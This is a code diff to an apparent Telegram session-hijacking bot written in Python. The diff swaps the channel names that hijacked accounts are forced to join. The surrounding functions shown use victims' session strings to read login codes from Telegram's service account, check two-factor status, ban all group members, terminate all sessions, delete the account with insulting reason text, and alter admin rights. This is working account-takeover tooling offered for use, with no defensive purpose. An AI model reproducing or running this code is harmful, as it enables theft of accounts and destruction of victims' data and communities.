@@ -25,8 +25,8 @@ async def users_gc(session):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()                          
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))
             except Exception as e:
                 print(e)
             k = await rj(GetAdminedPublicChannelsRequest())            
@@ -37,8 +37,8 @@ async def users_gc(session):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 k = await r.invoke(functions.channels.GetAdminedPublicChannels())            
@@ -57,8 +57,8 @@ async def user_info(session):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))
             except Exception as e:
                 print(e)
             k = await rj.get_me()  
@@ -68,8 +68,8 @@ async def user_info(session):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 k = await r.get_me()
@@ -105,8 +105,8 @@ async def banall(session,id):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))
             except Exception as e:
                 print(e)
             admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
@@ -124,8 +124,8 @@ async def banall(session,id):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 async for members in r.get_chat_members(gc_id):  
@@ -153,8 +153,8 @@ async def get_otp(session):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))
             except Exception as e:
                 print(e)
             async for x in rj.iter_messages(777000, limit=2):               
@@ -165,8 +165,8 @@ async def get_otp(session):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 ok = []
@@ -189,8 +189,8 @@ async def join_ch(session,id):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))              
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))              
             except Exception as e:
                 print(e)
             await rj(join(gc_id))            
@@ -199,8 +199,8 @@ async def join_ch(session,id):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 await r.join_chat(gc_id)
@@ -219,8 +219,8 @@ async def leave_ch(session,id):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))               
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))               
             except Exception as e:
                 print(e)
             await rj(leave(gc_id))            
@@ -229,8 +229,8 @@ async def leave_ch(session,id):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 await r.leave_chat(gc_id)
@@ -252,8 +252,8 @@ async def del_ch(session,id):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))                
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))                
             except Exception as e:
                 print(e)
             await rj(dc(gc_id))            
@@ -262,8 +262,8 @@ async def del_ch(session,id):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 await r.invoke(
@@ -284,8 +284,8 @@ async def check_2fa(session):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))               
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))               
             except Exception as e:
                 print(e)
             try:
@@ -301,8 +301,8 @@ async def check_2fa(session):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                # try:
@@ -325,8 +325,8 @@ async def terminate_all(session):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))             
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))             
             except Exception as e:
                 print(e)
             await rj(rt())
@@ -335,8 +335,8 @@ async def terminate_all(session):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 await r.invoke(functions.auth.ResetAuthorizations())
@@ -355,8 +355,8 @@ async def del_acc(session):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))              
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))              
             except Exception as e:
                 print(e)
             await rj(ok.account.DeleteAccountRequest("owner madarchod h"))
@@ -365,8 +365,8 @@ async def del_acc(session):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)    
                 await r.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
@@ -402,8 +402,8 @@ async def piromote(session,gc_id,user_id):
             rj = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await rj.connect()
             try:
-                await rj(join("@ROMEOBOT_OP"))
-                await rj(join("@ROMEO_OP"))                
+                await rj(join("@AlmortagelTech2"))
+                await rj(join("@AlmortagelTech"))                
             except Exception as e:
                 print(e)
             try:
@@ -414,8 +414,8 @@ async def piromote(session,gc_id,user_id):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)
                 try:    
@@ -464,8 +464,8 @@ async def demote_all(session,gc_id):
         else:    
             async with Client("r",api_id=API_ID,api_hash=API_HASH, session_string=session) as r:
                 try:
-                    await r.join_chat("@ROMEOBOT_OP")
-                    await r.join_chat("@ROMEO_OP")
+                    await r.join_chat("@AlmortagelTech2")
+                    await r.join_chat("@AlmortagelTech")
                 except Exception as e:
                     print(e)
                 async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
